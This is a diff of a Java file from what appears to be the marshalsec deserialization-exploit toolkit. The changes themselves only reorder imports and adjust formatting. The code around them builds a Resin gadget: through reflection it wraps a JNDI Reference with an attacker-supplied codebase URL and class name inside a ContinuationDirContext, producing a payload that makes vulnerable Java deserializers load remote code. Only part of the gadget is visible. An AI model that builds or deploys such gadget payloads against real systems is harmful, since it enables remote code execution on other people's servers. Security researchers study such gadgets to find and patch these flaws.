@@ -23,32 +23,29 @@ SOFTWARE.
 package marshalsec.gadgets;
 
 
-import java.lang.reflect.Constructor;
-import java.util.Hashtable;
-
-import javax.naming.CannotProceedException;
-import javax.naming.Reference;
-import javax.naming.directory.DirContext;
-
 import com.caucho.naming.QName;
-
 import marshalsec.MarshallerBase;
 import marshalsec.UtilFactory;
 import marshalsec.util.Reflections;
 
+import javax.naming.CannotProceedException;
+import javax.naming.Reference;
+import javax.naming.directory.DirContext;
+import java.lang.reflect.Constructor;
+import java.util.Hashtable;
+
 
 /**
  * @author mbechler
- *
  */
 public interface Resin extends Gadget {
 
-    @Args ( minArgs = 2, args = {
-        "codebase", "class"
+    @Args(minArgs = 2, args = {
+            "codebase", "class"
     }, defaultArgs = {
-        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
-    } )
-    default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
+    })
+    default Object makeResinQName(UtilFactory uf, String[] args) throws Exception {
 
         Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
         Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
@@ -57,7 +54,7 @@ public interface Resin extends Gadget {
         Reflections.setFieldValue(cpe, "cause", null);
         Reflections.setFieldValue(cpe, "stackTrace", null);
 
-        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ]));
+        cpe.setResolvedObj(new Reference("Foo", args[1], args[0]));
 
         Reflections.setFieldValue(cpe, "suppressedExceptions", null);
         DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
